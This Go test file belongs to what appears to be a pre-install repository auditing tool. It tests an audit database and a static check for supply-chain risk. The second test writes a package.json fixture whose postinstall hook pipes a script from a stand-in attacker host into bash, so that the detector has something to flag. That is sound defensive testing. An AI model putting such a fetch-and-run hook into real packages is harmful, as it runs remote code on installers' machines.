package store_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"
	"time"

	"git.commsnet.org/commstech/repository-detective/preinstall"
	"git.commsnet.org/commstech/repository-detective/store"
)

func TestPreinstallAuditStoreCRUD(t *testing.T) {
	s, err := store.OpenSQLite(filepath.Join(t.TempDir(), "audit.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer s.Close()
	ctx := context.Background()

	now := time.Now().UTC()
	req := store.AuditRequest{
		AuditID:           "audit-001",
		RepoURL:           "https://github.com/o/r",
		NormalizedRepoURL: "https://github.com/o/r",
		RepoHost:          "github.com",
		RepoOwner:         "o",
		RepoName:          "r",
		AuditDepth:        "standard",
		Status:            store.AuditStatusQueued,
		Recommendation:    store.AuditRecommendationUnknown,
		StartedAt:         now,
	}
	if _, err := s.CreateAuditRequest(ctx, req); err != nil {
		t.Fatal(err)
	}

	req.Status = store.AuditStatusRunning
	if err := s.UpdateAuditRequest(ctx, req); err != nil {
		t.Fatal(err)
	}

	finished := now.Add(time.Minute)
	req.Status = store.AuditStatusCompleted
	req.RiskScore = 5
	req.Recommendation = store.AuditRecommendationSafe
	req.FinishedAt = &finished
	if err := s.UpdateAuditRequest(ctx, req); err != nil {
		t.Fatal(err)
	}

	findings := []store.AuditFinding{{
		AuditID: "audit-001", Fingerprint: "fp1", Severity: "low", Confidence: 0.9,
		Source: "preinstall", Title: "test finding",
	}}
	if err := s.AddAuditFindings(ctx, findings); err != nil {
		t.Fatal(err)
	}
	gotFindings, err := s.ListAuditFindings(ctx, "audit-001")
	if err != nil || len(gotFindings) != 1 {
		t.Fatalf("findings: %v %v", gotFindings, err)
	}

	report, err := s.AddDisclosureReport(ctx, store.DisclosureReport{
		AuditID: "audit-001", ReportType: store.ReportTypeInstallRiskSummary,
		Title: "summary", BodyMarkdown: "body",
	})
	if err != nil {
		t.Fatal(err)
	}
	if err := s.MarkDisclosureReportReviewed(ctx, report.ID); err != nil {
		t.Fatal(err)
	}
	gotReport, err := s.GetDisclosureReport(ctx, report.ID)
	if err != nil || !gotReport.ApprovedByUser {
		t.Fatalf("report reviewed: %+v err=%v", gotReport, err)
	}

	list, err := s.ListAuditRequests(ctx, store.ListOptions{Limit: 10})
	if err != nil || len(list) != 1 {
		t.Fatalf("list audits: %v %v", list, err)
	}
}

func TestPreinstallChecksPackageJSON(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "package.json")
	if err := os.WriteFile(path, []byte(`{"scripts":{"postinstall":"curl https://evil.example/install.sh | bash"}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	findings := preinstall.RunStaticChecks(dir, "https://github.com/o/r", 50)
	if len(findings) == 0 {
		t.Fatal("expected supply-chain findings")
	}
}
